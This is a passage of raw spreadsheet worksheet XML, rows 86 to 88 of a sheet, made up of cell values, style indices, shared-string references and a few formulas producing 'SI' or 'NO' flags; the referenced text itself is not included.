      <c r="AG86" s="225" t="s">
        <v>1407</v>
      </c>
      <c r="AH86" s="271" t="s">
        <v>1396</v>
      </c>
      <c r="AI86" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ86" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK86" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL86" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM86" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN86" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO86" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP86" s="230"/>
      <c r="AQ86" s="230"/>
      <c r="AR86" s="288">
        <v>3</v>
      </c>
      <c r="AS86" s="288">
        <v>1</v>
      </c>
      <c r="AT86" s="288">
        <v>0</v>
      </c>
      <c r="AU86" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV86" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW86" s="288">
        <v>1</v>
      </c>
      <c r="AX86" s="288">
        <v>1</v>
      </c>
      <c r="AY86" s="288">
        <v>0</v>
      </c>
      <c r="AZ86" s="288">
        <f>AX86+AY86</f>
        <v>1</v>
      </c>
      <c r="BA86" s="289" t="s">
        <v>1412</v>
      </c>
      <c r="BB86" s="301">
        <v>161</v>
      </c>
      <c r="BC86" s="302">
        <v>0</v>
      </c>
      <c r="BD86" s="302" t="s">
        <v>1409</v>
      </c>
      <c r="BE86" s="302">
        <v>4</v>
      </c>
      <c r="BF86" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG86" s="302" t="s">
        <v>1409</v>
      </c>
      <c r="BH86" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI86" s="302" t="s">
        <v>1409</v>
      </c>
      <c r="BJ86" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK86" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL86" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM86" s="302">
        <v>0</v>
      </c>
      <c r="BN86" s="304">
        <v>3</v>
      </c>
      <c r="BO86" s="304">
        <v>0</v>
      </c>
      <c r="BP86" s="304">
        <v>0</v>
      </c>
      <c r="BQ86" s="304">
        <v>0</v>
      </c>
      <c r="BR86" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS86" s="304">
        <v>77</v>
      </c>
      <c r="BT86" s="304">
        <v>0</v>
      </c>
      <c r="BU86" s="304">
        <v>161</v>
      </c>
      <c r="BV86" s="305">
        <v>0</v>
      </c>
      <c r="BW86" s="317">
        <v>203</v>
      </c>
      <c r="BX86" s="318">
        <v>0</v>
      </c>
      <c r="BY86" s="318" t="s">
        <v>1410</v>
      </c>
      <c r="BZ86" s="318">
        <v>5</v>
      </c>
      <c r="CA86" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB86" s="318" t="s">
        <v>1410</v>
      </c>
      <c r="CC86" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD86" s="318" t="s">
        <v>1410</v>
      </c>
      <c r="CE86" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF86" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG86" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH86" s="318">
        <v>0</v>
      </c>
      <c r="CI86" s="319">
        <v>0</v>
      </c>
      <c r="CJ86" s="319">
        <v>0</v>
      </c>
      <c r="CK86" s="319">
        <v>0</v>
      </c>
      <c r="CL86" s="319">
        <v>0</v>
      </c>
      <c r="CM86" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN86" s="319">
        <v>77</v>
      </c>
      <c r="CO86" s="319">
        <v>0</v>
      </c>
      <c r="CP86" s="319">
        <v>161</v>
      </c>
      <c r="CQ86" s="319">
        <v>42</v>
      </c>
      <c r="CR86" s="319">
        <v>161</v>
      </c>
      <c r="CS86" s="320">
        <v>0</v>
      </c>
      <c r="CT86" s="339">
        <v>203</v>
      </c>
      <c r="CU86" s="340">
        <v>0</v>
      </c>
      <c r="CV86" s="340" t="s">
        <v>1410</v>
      </c>
      <c r="CW86" s="340">
        <v>5</v>
      </c>
      <c r="CX86" s="340"/>
      <c r="CY86" s="340" t="s">
        <v>1410</v>
      </c>
      <c r="CZ86" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA86" s="340" t="s">
        <v>1410</v>
      </c>
      <c r="DB86" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC86" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD86" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE86" s="340">
        <v>0</v>
      </c>
      <c r="DF86" s="341">
        <v>3</v>
      </c>
      <c r="DG86" s="341">
        <v>0</v>
      </c>
      <c r="DH86" s="341">
        <v>0</v>
      </c>
      <c r="DI86" s="341">
        <v>0</v>
      </c>
      <c r="DJ86" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK86" s="341">
        <v>77</v>
      </c>
      <c r="DL86" s="341">
        <v>0</v>
      </c>
      <c r="DM86" s="341">
        <v>161</v>
      </c>
      <c r="DN86" s="341">
        <v>42</v>
      </c>
      <c r="DO86" s="341">
        <v>161</v>
      </c>
      <c r="DP86" s="342">
        <v>0</v>
      </c>
      <c r="DQ86" s="355">
        <v>286</v>
      </c>
      <c r="DR86" s="356">
        <v>0</v>
      </c>
      <c r="DS86" s="356" t="s">
        <v>1411</v>
      </c>
      <c r="DT86" s="356">
        <v>10</v>
      </c>
      <c r="DU86" s="356"/>
      <c r="DV86" s="356" t="s">
        <v>1411</v>
      </c>
      <c r="DW86" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX86" s="356" t="s">
        <v>1411</v>
      </c>
      <c r="DY86" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ86" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA86" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB86" s="356">
        <v>0</v>
      </c>
      <c r="EC86" s="357">
        <v>0</v>
      </c>
      <c r="ED86" s="357">
        <v>0</v>
      </c>
      <c r="EE86" s="357">
        <v>0</v>
      </c>
      <c r="EF86" s="357">
        <v>0</v>
      </c>
      <c r="EG86" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH86" s="357">
        <v>78</v>
      </c>
      <c r="EI86" s="357">
        <v>0</v>
      </c>
      <c r="EJ86" s="357">
        <v>161</v>
      </c>
      <c r="EK86" s="357">
        <v>125</v>
      </c>
      <c r="EL86" s="357">
        <v>166</v>
      </c>
      <c r="EM86" s="358">
        <v>0</v>
      </c>
      <c r="EN86" s="368" t="str">
        <f t="shared" si="22"/>
        <v>NO</v>
      </c>
      <c r="EO86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP86" s="369"/>
      <c r="EQ86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES86" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV86" s="369"/>
      <c r="EW86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX86" s="369"/>
      <c r="EY86" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ86" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA86" s="369"/>
      <c r="FB86" s="369"/>
      <c r="FC86" s="369">
        <v>2</v>
      </c>
      <c r="FD86" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE86" s="369">
        <v>0</v>
      </c>
      <c r="FF86" s="369">
        <v>0</v>
      </c>
      <c r="FG86" s="369">
        <v>0</v>
      </c>
      <c r="FH86" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI86" s="377" t="str">
        <f t="shared" si="23"/>
        <v>NO</v>
      </c>
      <c r="FJ86" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK86" s="378"/>
      <c r="FL86" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM86" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN86" s="378"/>
      <c r="FO86" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP86" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ86" s="378"/>
      <c r="FR86" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS86" s="380"/>
      <c r="FT86" s="380"/>
      <c r="FU86" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV86" s="378"/>
      <c r="FW86" s="378"/>
      <c r="FX86" s="378">
        <v>5</v>
      </c>
      <c r="FY86" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ86" s="378">
        <v>0</v>
      </c>
      <c r="GA86" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB86" s="378">
        <v>0</v>
      </c>
      <c r="GC86" s="379" t="s">
        <v>12</v>
      </c>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c r="LH86" s="40"/>
      <c r="LI86" s="40"/>
    </row>
    <row r="87" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B87" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C87" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D87" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E87" s="225" t="s">
        <v>1374</v>
      </c>
      <c r="F87" s="225">
        <v>47</v>
      </c>
      <c r="G87" s="225" t="s">
        <v>1375</v>
      </c>
      <c r="H87" s="226" t="s">
        <v>1376</v>
      </c>
      <c r="I87" s="225"/>
      <c r="J87" s="225" t="s">
        <v>1377</v>
      </c>
      <c r="K87" s="227" t="s">
        <v>1413</v>
      </c>
      <c r="L87" s="228" t="s">
        <v>280</v>
      </c>
      <c r="M87" s="227" t="s">
        <v>541</v>
      </c>
      <c r="N87" s="227" t="s">
        <v>1414</v>
      </c>
      <c r="O87" s="389" t="s">
        <v>2730</v>
      </c>
      <c r="P87" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q87" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R87" s="225"/>
      <c r="S87" s="396"/>
      <c r="T87" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U87" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V87" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W87" s="231"/>
      <c r="X87" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y87" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z87" s="256" t="s">
        <v>1415</v>
      </c>
      <c r="AA87" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB87" s="256" t="s">
        <v>2488</v>
      </c>
      <c r="AC87" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD87" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE87" s="259" t="s">
        <v>1310</v>
      </c>
      <c r="AF87" s="270" t="s">
        <v>1416</v>
      </c>
      <c r="AG87" s="225" t="s">
        <v>1417</v>
      </c>
      <c r="AH87" s="271" t="s">
        <v>1396</v>
      </c>
      <c r="AI87" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ87" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK87" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL87" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM87" s="229" t="s">
        <v>1418</v>
      </c>
      <c r="AN87" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO87" s="290"/>
      <c r="AP87" s="230"/>
      <c r="AQ87" s="230"/>
      <c r="AR87" s="288">
        <v>953</v>
      </c>
      <c r="AS87" s="288">
        <v>952</v>
      </c>
      <c r="AT87" s="288">
        <v>0</v>
      </c>
      <c r="AU87" s="288">
        <f t="shared" si="24"/>
        <v>952</v>
      </c>
      <c r="AV87" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW87" s="288">
        <v>952</v>
      </c>
      <c r="AX87" s="288">
        <v>952</v>
      </c>
      <c r="AY87" s="288">
        <v>0</v>
      </c>
      <c r="AZ87" s="288">
        <v>952</v>
      </c>
      <c r="BA87" s="289" t="s">
        <v>1420</v>
      </c>
      <c r="BB87" s="301">
        <v>565</v>
      </c>
      <c r="BC87" s="302">
        <v>565</v>
      </c>
      <c r="BD87" s="302">
        <v>40063</v>
      </c>
      <c r="BE87" s="302">
        <v>1</v>
      </c>
      <c r="BF87" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG87" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH87" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI87" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ87" s="302" t="str">
        <f t="shared" si="25"/>
        <v>40063, -</v>
      </c>
      <c r="BK87" s="302">
        <v>40063</v>
      </c>
      <c r="BL87" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM87" s="302">
        <v>1</v>
      </c>
      <c r="BN87" s="304">
        <v>952</v>
      </c>
      <c r="BO87" s="304">
        <v>565</v>
      </c>
      <c r="BP87" s="304">
        <v>565</v>
      </c>
      <c r="BQ87" s="304">
        <v>0</v>
      </c>
      <c r="BR87" s="304">
        <f t="shared" si="26"/>
        <v>565</v>
      </c>
      <c r="BS87" s="304">
        <v>565</v>
      </c>
      <c r="BT87" s="304">
        <v>565</v>
      </c>
      <c r="BU87" s="304">
        <v>565</v>
      </c>
      <c r="BV87" s="305">
        <v>565</v>
      </c>
      <c r="BW87" s="317">
        <v>565</v>
      </c>
      <c r="BX87" s="318">
        <v>566</v>
      </c>
      <c r="BY87" s="318">
        <v>40063</v>
      </c>
      <c r="BZ87" s="318">
        <v>1</v>
      </c>
      <c r="CA87" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB87" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC87" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD87" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE87" s="318" t="str">
        <f t="shared" si="27"/>
        <v>40063, -</v>
      </c>
      <c r="CF87" s="318">
        <v>40063</v>
      </c>
      <c r="CG87" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH87" s="318">
        <v>1</v>
      </c>
      <c r="CI87" s="319">
        <v>952</v>
      </c>
      <c r="CJ87" s="319">
        <v>565</v>
      </c>
      <c r="CK87" s="319">
        <v>565</v>
      </c>
      <c r="CL87" s="319">
        <v>0</v>
      </c>
      <c r="CM87" s="319">
        <f t="shared" si="28"/>
        <v>565</v>
      </c>
      <c r="CN87" s="319">
        <v>565</v>
      </c>
      <c r="CO87" s="319">
        <v>565</v>
      </c>
      <c r="CP87" s="319">
        <v>565</v>
      </c>
      <c r="CQ87" s="319">
        <v>0</v>
      </c>
      <c r="CR87" s="319">
        <v>565</v>
      </c>
      <c r="CS87" s="320">
        <v>565</v>
      </c>
      <c r="CT87" s="339">
        <v>565</v>
      </c>
      <c r="CU87" s="340">
        <v>565</v>
      </c>
      <c r="CV87" s="340">
        <v>40063</v>
      </c>
      <c r="CW87" s="340">
        <v>1</v>
      </c>
      <c r="CX87" s="340"/>
      <c r="CY87" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ87" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA87" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB87" s="340" t="str">
        <f t="shared" si="29"/>
        <v>40063, -</v>
      </c>
      <c r="DC87" s="340">
        <v>40063</v>
      </c>
      <c r="DD87" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE87" s="340">
        <v>1</v>
      </c>
      <c r="DF87" s="341">
        <v>952</v>
      </c>
      <c r="DG87" s="341">
        <v>565</v>
      </c>
      <c r="DH87" s="341">
        <v>565</v>
      </c>
      <c r="DI87" s="341">
        <v>0</v>
      </c>
      <c r="DJ87" s="341">
        <f t="shared" si="30"/>
        <v>565</v>
      </c>
      <c r="DK87" s="341">
        <v>565</v>
      </c>
      <c r="DL87" s="341">
        <v>565</v>
      </c>
      <c r="DM87" s="341">
        <v>565</v>
      </c>
      <c r="DN87" s="341">
        <v>0</v>
      </c>
      <c r="DO87" s="341">
        <v>565</v>
      </c>
      <c r="DP87" s="342">
        <v>565</v>
      </c>
      <c r="DQ87" s="355">
        <v>569</v>
      </c>
      <c r="DR87" s="356">
        <v>564</v>
      </c>
      <c r="DS87" s="356" t="s">
        <v>1419</v>
      </c>
      <c r="DT87" s="356">
        <v>3</v>
      </c>
      <c r="DU87" s="356"/>
      <c r="DV87" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DW87" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX87" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DY87" s="356" t="str">
        <f t="shared" si="31"/>
        <v>40063, -</v>
      </c>
      <c r="DZ87" s="356">
        <v>40063</v>
      </c>
      <c r="EA87" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB87" s="356">
        <v>1</v>
      </c>
      <c r="EC87" s="357">
        <v>952</v>
      </c>
      <c r="ED87" s="357">
        <v>566</v>
      </c>
      <c r="EE87" s="357">
        <v>565</v>
      </c>
      <c r="EF87" s="357">
        <v>0</v>
      </c>
      <c r="EG87" s="357">
        <f t="shared" si="32"/>
        <v>565</v>
      </c>
      <c r="EH87" s="357">
        <v>567</v>
      </c>
      <c r="EI87" s="357">
        <v>565</v>
      </c>
      <c r="EJ87" s="357">
        <v>565</v>
      </c>
      <c r="EK87" s="357">
        <v>4</v>
      </c>
      <c r="EL87" s="357">
        <v>569</v>
      </c>
      <c r="EM87" s="358">
        <v>565</v>
      </c>
      <c r="EN87" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP87" s="369"/>
      <c r="EQ87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES87" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV87" s="369"/>
      <c r="EW87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX87" s="369"/>
      <c r="EY87" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ87" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA87" s="369"/>
      <c r="FB87" s="369"/>
      <c r="FC87" s="369">
        <v>952</v>
      </c>
      <c r="FD87" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE87" s="369">
        <v>0</v>
      </c>
      <c r="FF87" s="369">
        <v>0</v>
      </c>
      <c r="FG87" s="369">
        <v>0</v>
      </c>
      <c r="FH87" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI87" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ87" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK87" s="378"/>
      <c r="FL87" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM87" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN87" s="378"/>
      <c r="FO87" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP87" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ87" s="378"/>
      <c r="FR87" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS87" s="380"/>
      <c r="FT87" s="380"/>
      <c r="FU87" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV87" s="378"/>
      <c r="FW87" s="378"/>
      <c r="FX87" s="378">
        <v>0</v>
      </c>
      <c r="FY87" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ87" s="378">
        <v>0</v>
      </c>
      <c r="GA87" s="378"/>
      <c r="GB87" s="378">
        <v>0</v>
      </c>
      <c r="GC87" s="379" t="s">
        <v>12</v>
      </c>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IY87" s="40"/>
      <c r="IZ87" s="40"/>
      <c r="JA87" s="40"/>
      <c r="JB87" s="40"/>
      <c r="JC87" s="40"/>
      <c r="JD87" s="40"/>
      <c r="JE87" s="40"/>
      <c r="JF87" s="40"/>
      <c r="JG87" s="40"/>
      <c r="JH87" s="40"/>
      <c r="JI87" s="40"/>
      <c r="JJ87" s="40"/>
      <c r="JK87" s="40"/>
      <c r="JL87" s="40"/>
      <c r="JM87" s="40"/>
      <c r="JN87" s="40"/>
      <c r="JO87" s="40"/>
      <c r="JP87" s="40"/>
      <c r="JQ87" s="40"/>
      <c r="JR87" s="40"/>
      <c r="JS87" s="40"/>
      <c r="JT87" s="40"/>
      <c r="JU87" s="40"/>
      <c r="JV87" s="40"/>
      <c r="JW87" s="40"/>
      <c r="JX87" s="40"/>
      <c r="JY87" s="40"/>
      <c r="JZ87" s="40"/>
      <c r="KA87" s="40"/>
      <c r="KB87" s="40"/>
      <c r="KC87" s="40"/>
      <c r="KD87" s="40"/>
      <c r="KE87" s="40"/>
      <c r="KF87" s="40"/>
      <c r="KG87" s="40"/>
      <c r="KH87" s="40"/>
      <c r="KI87" s="40"/>
      <c r="KJ87" s="40"/>
      <c r="KK87" s="40"/>
      <c r="KL87" s="40"/>
      <c r="KM87" s="40"/>
      <c r="KN87" s="40"/>
      <c r="KO87" s="40"/>
      <c r="KP87" s="40"/>
      <c r="KQ87" s="40"/>
      <c r="KR87" s="40"/>
      <c r="KS87" s="40"/>
      <c r="KT87" s="40"/>
      <c r="KU87" s="40"/>
      <c r="KV87" s="40"/>
      <c r="KW87" s="40"/>
      <c r="KX87" s="40"/>
      <c r="KY87" s="40"/>
      <c r="KZ87" s="40"/>
      <c r="LA87" s="40"/>
      <c r="LB87" s="40"/>
      <c r="LC87" s="40"/>
      <c r="LD87" s="40"/>
      <c r="LE87" s="40"/>
      <c r="LF87" s="40"/>
      <c r="LG87" s="40"/>
      <c r="LH87" s="40"/>
      <c r="LI87" s="40"/>
    </row>
    <row r="88" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B88" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C88" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D88" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E88" s="225" t="s">
        <v>1374</v>
      </c>
      <c r="F88" s="225">
        <v>47</v>
      </c>
      <c r="G88" s="225" t="s">
        <v>1375</v>
      </c>
      <c r="H88" s="226" t="s">
        <v>1376</v>
      </c>
      <c r="I88" s="225"/>
      <c r="J88" s="225" t="s">
        <v>1377</v>
      </c>
      <c r="K88" s="227" t="s">
        <v>1421</v>
      </c>
      <c r="L88" s="228" t="s">
        <v>280</v>
      </c>
      <c r="M88" s="227" t="s">
        <v>1422</v>
      </c>
      <c r="N88" s="227" t="s">
        <v>1423</v>
      </c>
      <c r="O88" s="389" t="s">
        <v>2731</v>
      </c>
      <c r="P88" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q88" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R88" s="225"/>
      <c r="S88" s="396"/>
      <c r="T88" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U88" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V88" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W88" s="231"/>
      <c r="X88" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y88" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z88" s="256" t="s">
        <v>1424</v>
      </c>
      <c r="AA88" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB88" s="256" t="s">
        <v>2489</v>
      </c>
      <c r="AC88" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD88" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE88" s="259" t="s">
        <v>1310</v>
      </c>
      <c r="AF88" s="270" t="s">
        <v>1425</v>
      </c>
      <c r="AG88" s="225" t="s">
        <v>1426</v>
      </c>
      <c r="AH88" s="271" t="s">
        <v>1396</v>
      </c>
      <c r="AI88" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ88" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK88" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL88" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM88" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN88" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO88" s="290" t="s">
        <v>13</v>
      </c>
      <c r="AP88" s="230"/>
      <c r="AQ88" s="230"/>
      <c r="AR88" s="288">
        <v>3</v>
      </c>
      <c r="AS88" s="288">
        <v>1</v>
      </c>
      <c r="AT88" s="288">
        <v>0</v>
      </c>
      <c r="AU88" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV88" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW88" s="288">
        <v>1</v>
      </c>
      <c r="AX88" s="288">
        <v>1</v>
      </c>
      <c r="AY88" s="288">
        <v>0</v>
      </c>
      <c r="AZ88" s="288">
        <f>AX88+AY88</f>
        <v>1</v>
      </c>
      <c r="BA88" s="289" t="s">
        <v>1428</v>
      </c>
      <c r="BB88" s="301">
        <v>1</v>
      </c>
      <c r="BC88" s="302">
        <v>0</v>
      </c>
      <c r="BD88" s="302">
        <v>1325</v>
      </c>
      <c r="BE88" s="302">
        <v>1</v>
      </c>
      <c r="BF88" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG88" s="302">
        <v>1325</v>
      </c>
      <c r="BH88" s="302">
        <v>1325</v>
      </c>
      <c r="BI88" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ88" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK88" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL88" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM88" s="302">
        <v>0</v>
      </c>
      <c r="BN88" s="304">
        <v>4</v>
      </c>
      <c r="BO88" s="304">
        <v>0</v>
      </c>
      <c r="BP88" s="304">
        <v>0</v>
      </c>
      <c r="BQ88" s="304">
        <v>0</v>
      </c>
      <c r="BR88" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS88" s="304">
        <v>1</v>
      </c>
      <c r="BT88" s="304">
        <v>0</v>
      </c>
      <c r="BU88" s="304">
        <v>1</v>
      </c>
      <c r="BV88" s="305">
        <v>0</v>
      </c>
      <c r="BW88" s="317">
        <v>1</v>
      </c>
      <c r="BX88" s="318">
        <v>0</v>
      </c>
      <c r="BY88" s="318">
        <v>1325</v>
      </c>
      <c r="BZ88" s="318">
        <v>1</v>
      </c>
      <c r="CA88" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB88" s="318">
        <v>1325</v>
      </c>
      <c r="CC88" s="318">
        <v>1325</v>
      </c>
      <c r="CD88" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE88" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF88" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG88" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH88" s="318">
        <v>0</v>
      </c>
      <c r="CI88" s="319">
        <v>3</v>
      </c>
      <c r="CJ88" s="319">
        <v>0</v>
      </c>
      <c r="CK88" s="319">
        <v>0</v>
      </c>
      <c r="CL88" s="319">
        <v>0</v>
      </c>
      <c r="CM88" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN88" s="319">
        <v>1</v>
      </c>
      <c r="CO88" s="319">
        <v>0</v>
      </c>
      <c r="CP88" s="319">
        <v>1</v>
      </c>
      <c r="CQ88" s="319">
        <v>0</v>
      </c>
      <c r="CR88" s="319">
        <v>1</v>
      </c>
      <c r="CS88" s="320">
        <v>0</v>
      </c>
      <c r="CT88" s="339">
        <v>1</v>
      </c>
      <c r="CU88" s="340">
        <v>0</v>
      </c>
      <c r="CV88" s="340">
        <v>1325</v>
      </c>
      <c r="CW88" s="340">
        <v>1</v>
      </c>
      <c r="CX88" s="340"/>
      <c r="CY88" s="340">
        <v>1325</v>
      </c>
      <c r="CZ88" s="340">
        <v>1325</v>
      </c>
      <c r="DA88" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB88" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC88" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD88" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE88" s="340">
        <v>0</v>
      </c>
      <c r="DF88" s="341">
        <v>4</v>
      </c>
      <c r="DG88" s="341">
        <v>0</v>
      </c>
      <c r="DH88" s="341">
        <v>0</v>
      </c>
      <c r="DI88" s="341">
        <v>0</v>
      </c>
      <c r="DJ88" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK88" s="341">
        <v>1</v>
      </c>
      <c r="DL88" s="341">
        <v>0</v>
      </c>
      <c r="DM88" s="341">
        <v>1</v>
      </c>
      <c r="DN88" s="341">
        <v>0</v>
      </c>
      <c r="DO88" s="341">
        <v>1</v>
      </c>
      <c r="DP88" s="342">
        <v>0</v>
      </c>
      <c r="DQ88" s="355">
        <v>5</v>
      </c>
      <c r="DR88" s="356">
        <v>0</v>
      </c>
      <c r="DS88" s="356" t="s">
        <v>1427</v>
      </c>
      <c r="DT88" s="356">
        <v>3</v>
      </c>
      <c r="DU88" s="356"/>
      <c r="DV88" s="356" t="s">
        <v>1427</v>
      </c>
      <c r="DW88" s="356">
        <v>1325</v>
      </c>
      <c r="DX88" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DY88" s="356" t="str">
        <f t="shared" si="31"/>
